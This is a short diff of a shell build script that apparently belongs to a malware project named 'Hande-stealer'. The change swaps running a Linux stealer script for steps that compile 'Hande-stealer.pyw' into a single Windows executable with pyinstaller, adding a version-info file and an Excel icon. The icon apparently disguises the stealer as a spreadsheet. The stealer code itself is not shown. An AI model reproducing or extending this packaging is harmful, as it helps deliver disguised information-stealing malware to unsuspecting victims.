@@ -7,4 +7,6 @@ if test "`whoami`" != "root" ; then
 	exit
 fi
 
-sudo python Hande-stealer-linux.py
+echo "Compiling Windows executable..."
+sudo pyinstaller --clean --onefile --version-file file_version.txt --icon="excel.ico" Hande-stealer.pyw
+echo "Done!"
